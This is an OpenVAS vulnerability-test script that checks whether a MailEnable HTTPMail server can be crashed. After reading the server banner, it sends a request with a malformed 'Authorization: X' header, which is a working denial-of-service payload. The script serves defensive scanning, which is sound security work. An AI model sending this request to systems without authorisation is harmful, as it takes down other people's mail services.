# OpenVAS Vulnerability Test
# $Id: mailenable_httpmail_authorization_dos.nasl 5785 2017-03-30 09:19:35Z cfi $
# Description: MailEnable HTTPMail Service Authorization Header DoS Vulnerability
#
# Authors:
# George A. Theall, <theall@tifaware.com>
#
# Copyright:
# Copyright (C) 2004 George A. Theall
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.14654");
  script_version("2019-04-11T14:06:24+0000");
  script_tag(name:"last_modification", value:"2019-04-11 14:06:24 +0000 (Thu, 11 Apr 2019)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("MailEnable HTTPMail Service Authorization Header DoS Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 2004 George A. Theall");
  script_family("Denial of Service");
  script_dependencies("gb_get_http_banner.nasl");
  script_mandatory_keys("MailEnable/banner");
  script_require_ports("Services/www", 8080);

  script_tag(name:"solution", value:"Upgrade to MailEnable Professional / Enterprise 1.19 or later.");

  script_tag(name:"summary", value:"The remote web server is affected by a denial of service flaw.");

  script_tag(name:"insight", value:"The remote host is running an instance of MailEnable that has a flaw
  in the HTTPMail service (MEHTTPS.exe) in the Professional and Enterprise Editions. The flaw can be
  exploited by issuing an HTTP request with a malformed Authorization header, which causes a NULL
  pointer dereference error and crashes the HTTPMail service.");

  script_xref(name:"URL", value:"http://www.oliverkarow.de/research/MailWebHTTPAuthCrash.txt");
  script_xref(name:"URL", value:"http://archives.neohapsis.com/archives/bugtraq/2004-05/0159.html");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");

port = get_http_port(default:8080);

banner = get_http_banner(port:port);
if(!banner || ! egrep(pattern:"^Server: .*MailEnable", string:banner))
  exit(0);

if(http_is_dead(port:port))
  exit(0);

req = string("GET / HTTP/1.0\r\n",
             "Host: ", get_host_ip(), "\r\n",
             "Authorization: X\r\n",
             "\r\n");
res = http_send_recv(port:port, data:req);

if(!res && http_is_dead(port:port)) {
  security_message(port:port);
  exit(0);

}

exit(99);